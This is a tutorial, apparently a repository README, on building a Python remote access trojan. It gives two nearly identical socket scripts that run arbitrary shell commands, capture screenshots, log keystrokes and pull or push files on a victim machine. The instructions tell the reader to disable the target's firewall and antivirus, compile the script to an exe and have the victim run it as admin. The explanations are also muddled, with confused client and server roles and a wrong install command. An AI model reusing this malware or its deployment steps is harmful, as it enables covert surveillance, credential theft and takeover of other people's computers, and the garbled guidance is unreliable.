# trojan-virus-Rat-accesses-
this is for ethical hacking remote acesses trojan virus but is a very importent thing that you need to switch your ip adress and optional port to work from your Atckker machine in your ip adress in machine. , and also create a reverse shell connection frtom the target machine and how to do it you need to gather the ip adress from the traget machin then get a optional port, and also diable the firewall to allow connection from the port that you use and disable the windows defender from the target machine from order to get acesses to the machine from the file to not get blocket from the anti virus software.



you need to also edit the file and donwload visual stduio code and python install Dependencies from order to change the ip adress beacuse that is onlt way to change the ip adress from you computor ip adress and the port of your python script and get a reverse shell connection from the other file. And is to files the one from the file name call server.py is the ip adress from your computor ip adress and the client.py is from the target machine ip adress and both script need a port and this is only way to get this right. then you need to convert the script to an exe file and whatever platfrom from the target machine. the only thing that is you only create the file with the name of the server.py. and then you need to upload  the file from your local network or make a python host to order host the file from your browser. and the last step is that the target machine need to run the file as admin but before that you need to run the listner from your client.py script in your visual stduio code then you wait from your connection.  from python before the traget machine run the file 

this the Dependencies you need to insatll from python.

pip install socket
pip install PIL
pip install keyboard
pip install pyinstaller      



And then you need to create a file in visual studio code with the server.py and copy this script to the client.py

this is the client.py that you  ned to copy to visual stduio code!


import socket
import os
import subprocess
import time
import threading
from PIL import ImageGrab
import keyboard

# Server configuration
HOST = '10.0.0.45'  # Replace with your ip adress from the server.py
PORT = 5555

# Create a socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

print(f"Server listening on {HOST}:{PORT}")

# Accept client connection
client_socket, addr = server.accept()
print(f"Connection from {addr}")

# Keylogger file
log_file = "keylog.txt"
keylog_active = False
keylog_thread = None

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        with open("screenshot.png", "rb") as f:
            screenshot_data = f.read()
        os.remove("screenshot.png")  # Clean up temporary file
        return screenshot_data
    except Exception as e:
        return f"Error taking screenshot: {str(e)}".encode()

def log_keystrokes():
    global keylog_active
    with open(log_file, "a") as f:
        while keylog_active:
            try:
                event = keyboard.read_event(suppress=True)
                if event.event_type == keyboard.KEY_DOWN:
                    f.write(f"{event.name} at {time.ctime()}\n")
                    f.flush()  # Ensure data is written immediately
            except Exception as e:
                with open(log_file, "a") as err_f:
                    err_f.write(f"Keylog error: {str(e)}\n")
                time.sleep(1)  # Prevent tight CPU loop on error

# Main loop to receive commands
while True:
    try:
        command = client_socket.recv(1024).decode('utf-8')
        
        if command == "exit":
            if keylog_active:
                keylog_active = False
            client_socket.close()
            server.close()
            break
        elif command == "screenshot":
            screenshot_data = take_screenshot()
            if isinstance(screenshot_data, bytes):
                client_socket.send(str(len(screenshot_data)).encode('utf-8'))
                time.sleep(0.1)
                client_socket.sendall(screenshot_data)  # Use sendall for large data
            else:
                client_socket.send(screenshot_data)  # Error message if failed
        elif command == "keylog_start":
            if not keylog_active:
                keylog_active = True
                keylog_thread = threading.Thread(target=log_keystrokes)
                keylog_thread.daemon = True
                keylog_thread.start()
                client_socket.send("Keylogging started".encode('utf-8'))
            else:
                client_socket.send("Keylogging already running".encode('utf-8'))
        elif command == "keylog_stop":
            if keylog_active:
                keylog_active = False
                if keylog_thread:
                    keylog_thread.join(timeout=1)
                if os.path.exists(log_file):
                    with open(log_file, "r") as f:
                        logs = f.read()
                    client_socket.send(logs.encode('utf-8'))
                else:
                    client_socket.send("No logs found".encode('utf-8'))
            else:
                client_socket.send("Keylogging is not running".encode('utf-8'))
        elif command.startswith("download"):
            try:
                _, filename = command.split(" ", 1)
                if os.path.exists(filename):
                    with open(filename, "rb") as f:
                        file_data = f.read()
                    client_socket.send(str(len(file_data)).encode('utf-8'))
                    time.sleep(0.1)
                    client_socket.sendall(file_data)  # Use sendall for reliability
                else:
                    client_socket.send("File not found".encode('utf-8'))
            except Exception as e:
                client_socket.send(f"Error downloading file: {str(e)}".encode('utf-8'))
        else:
            # Execute command and return output
            try:
                result = subprocess.getoutput(command)
                client_socket.send(result.encode('utf-8'))
            except Exception as e:
                client_socket.send(f"Command execution failed: {str(e)}".encode('utf-8'))
    except UnicodeDecodeError:
        client_socket.send("Error: Invalid command encoding received".encode('utf-8'))
    except ConnectionError:
        print("Client disconnected")
        break
    except Exception as e:
        client_socket.send(f"Error: {str(e)}".encode('utf-8'))





and this is the server.py file script that you need to create to an exe file not the client.py in visual stduio code.

import socket
import os
import subprocess
import time
import threading
from PIL import ImageGrab
import keyboard

# Server configuration
HOST = '10.0.0.15'  # Updated to match client's target IP adress
PORT = 5555

# Create a socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

print(f"Server listening on {HOST}:{PORT}")

# Accept client connection
client_socket, addr = server.accept()
print(f"Connection from {addr}")

# Keylogger file
log_file = "keylog.txt"
keylog_active = False
keylog_thread = None

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        with open("screenshot.png", "rb") as f:
            screenshot_data = f.read()
        os.remove("screenshot.png")  # Clean up temporary file
        return screenshot_data
    except Exception as e:
        return f"Error taking screenshot: {str(e)}".encode()

def log_keystrokes():
    global keylog_active
    with open(log_file, "a") as f:
        while keylog_active:
            try:
                event = keyboard.read_event(suppress=True)
                if event.event_type == keyboard.KEY_DOWN:
                    f.write(f"{event.name} at {time.ctime()}\n")
                    f.flush()  # Ensure data is written immediately
            except Exception as e:
                with open(log_file, "a") as err_f:
                    err_f.write(f"Keylog error: {str(e)}\n")
                time.sleep(1)  # Prevent tight CPU loop on error

# Main loop to receive commands
while True:
    try:
        command = client_socket.recv(1024).decode('utf-8')
        
        if command == "exit":
            if keylog_active:
                keylog_active = False
            client_socket.close()
            server.close()
            break
        elif command == "screenshot":
            screenshot_data = take_screenshot()
            if isinstance(screenshot_data, bytes):
                client_socket.send(str(len(screenshot_data)).encode('utf-8'))
                time.sleep(0.1)
                client_socket.sendall(screenshot_data)  # Use sendall for large data
            else:
                client_socket.send(screenshot_data)  # Error message if failed
        elif command == "keylog_start":
            if not keylog_active:
                keylog_active = True
                keylog_thread = threading.Thread(target=log_keystrokes)
                keylog_thread.daemon = True
                keylog_thread.start()
                client_socket.send("Keylogging started".encode('utf-8'))
            else:
                client_socket.send("Keylogging already running".encode('utf-8'))
        elif command == "keylog_stop":
            if keylog_active:
                keylog_active = False
                if keylog_thread:
                    keylog_thread.join(timeout=1)
                if os.path.exists(log_file):
                    with open(log_file, "r") as f:
                        logs = f.read()
                    client_socket.send(logs.encode('utf-8'))
                else:
                    client_socket.send("No logs found".encode('utf-8'))
            else:
                client_socket.send("Keylogging is not running".encode('utf-8'))
        elif command.startswith("download"):
            try:
                _, filename = command.split(" ", 1)
                if os.path.exists(filename):
                    with open(filename, "rb") as f:
                        file_data = f.read()
                    client_socket.send(str(len(file_data)).encode('utf-8'))
                    time.sleep(0.1)
                    client_socket.sendall(file_data)  # Use sendall for reliability
                else:
                    client_socket.send("File not found".encode('utf-8'))
            except Exception as e:
                client_socket.send(f"Error downloading file: {str(e)}".encode('utf-8'))
        elif command.startswith("upload"):
            try:
                _, filename = command.split(" ", 1)
                size_data = client_socket.recv(1024).decode('utf-8')
                size = int(size_data)
                file_data = b""
                while len(file_data) < size:
                    chunk = client_socket.recv(size - len(file_data))
                    if not chunk:
                        break
                    file_data += chunk
                with open(f"uploaded_{filename}", "wb") as f:
                    f.write(file_data)
                client_socket.send(f"File uploaded as uploaded_{filename}".encode('utf-8'))
            except Exception as e:
                client_socket.send(f"Error uploading file: {str(e)}".encode('utf-8'))
        else:
            # Execute command and return output
            try:
                result = subprocess.getoutput(command)
                client_socket.send(result.encode('utf-8'))
            except Exception as e:
                client_socket.send(f"Command execution failed: {str(e)}".encode('utf-8'))
    except UnicodeDecodeError:
        client_socket.send("Error: Invalid command encoding received".encode('utf-8'))
    except ConnectionError:
        print("Client disconnected")
        break
    except Exception as e:
        client_socket.send(f"Error: {str(e)}".encode('utf-8'))



